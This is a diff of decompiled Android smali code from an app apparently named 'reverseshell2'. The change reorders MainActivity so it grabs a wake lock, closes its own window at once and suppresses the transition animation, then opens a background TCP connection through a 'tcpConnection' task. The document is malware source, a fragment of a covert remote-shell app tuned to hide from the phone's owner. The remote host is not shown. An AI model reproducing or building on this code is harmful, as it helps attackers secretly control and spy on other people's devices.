@@ -90,7 +90,7 @@
 
     invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
 
-    .line 25
+    .line 26
     const-string v1, "power"
 
     invoke-virtual {p0, v1}, Lcom/example/reverseshell2/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
@@ -99,7 +99,7 @@
 
     check-cast v1, Landroid/os/PowerManager;
 
-    .line 26
+    .line 27
     .local v1, "pm":Landroid/os/PowerManager;
     sget-object v2, Lcom/example/reverseshell2/MainActivity;->TAG:Ljava/lang/String;
 
@@ -111,12 +111,15 @@
 
     iput-object v2, p0, Lcom/example/reverseshell2/MainActivity;->mWakeLock:Landroid/os/PowerManager$WakeLock;
 
-    .line 27
+    .line 28
     iget-object v2, p0, Lcom/example/reverseshell2/MainActivity;->mWakeLock:Landroid/os/PowerManager$WakeLock;
 
     invoke-virtual {v2}, Landroid/os/PowerManager$WakeLock;->acquire()V
 
-    .line 28
+    .line 29
+    invoke-virtual {p0}, Lcom/example/reverseshell2/MainActivity;->finish()V
+
+    .line 30
     new-instance v2, Lcom/example/reverseshell2/tcpConnection;
 
     iget-object v3, p0, Lcom/example/reverseshell2/MainActivity;->activity:Landroid/app/Activity;
@@ -141,13 +144,10 @@
 
     invoke-virtual {v2, v3}, Lcom/example/reverseshell2/tcpConnection;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
 
-    .line 29
-    invoke-virtual {p0}, Lcom/example/reverseshell2/MainActivity;->finish()V
-
-    .line 30
+    .line 31
     invoke-virtual {p0, v0, v0}, Lcom/example/reverseshell2/MainActivity;->overridePendingTransition(II)V
 
-    .line 31
+    .line 32
     new-instance v0, Lcom/example/reverseshell2/functions;
 
     iget-object v2, p0, Lcom/example/reverseshell2/MainActivity;->activity:Landroid/app/Activity;
